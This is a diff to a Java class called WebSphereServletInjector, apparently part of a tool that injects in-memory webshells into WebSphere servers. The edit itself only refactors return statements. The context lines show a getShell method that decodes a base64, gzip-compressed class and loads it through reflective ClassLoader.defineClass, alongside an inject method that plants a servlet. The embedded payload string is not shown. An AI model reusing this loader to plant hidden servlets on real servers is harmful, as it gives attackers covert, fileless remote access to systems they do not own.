@@ -72,21 +72,19 @@ public class WebSphereServletInjector {
 
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        Object obj;
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         if (classLoader == null) {
             classLoader = context.getClass().getClassLoader();
         }
         try {
-            obj = classLoader.loadClass(getClassName()).newInstance();
+            return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            obj = clazz.newInstance();
+            return clazz.newInstance();
         }
-        return obj;
     }
 
     public void inject(Object context, Object servlet) throws Exception {
@@ -117,7 +115,6 @@ public class WebSphereServletInjector {
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
-
         try {
             gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
             byte[] buffer = new byte[4096];
@@ -125,16 +122,13 @@ public class WebSphereServletInjector {
             while ((n = gzipInputStream.read(buffer)) > 0) {
                 out.write(buffer, 0, n);
             }
+            return out.toByteArray();
         } finally {
             if (gzipInputStream != null) {
-                try {
-                    gzipInputStream.close();
-                } catch (IOException ignored) {
-                }
+                gzipInputStream.close();
             }
             out.close();
         }
-        return out.toByteArray();
     }
 
     @SuppressWarnings("all")
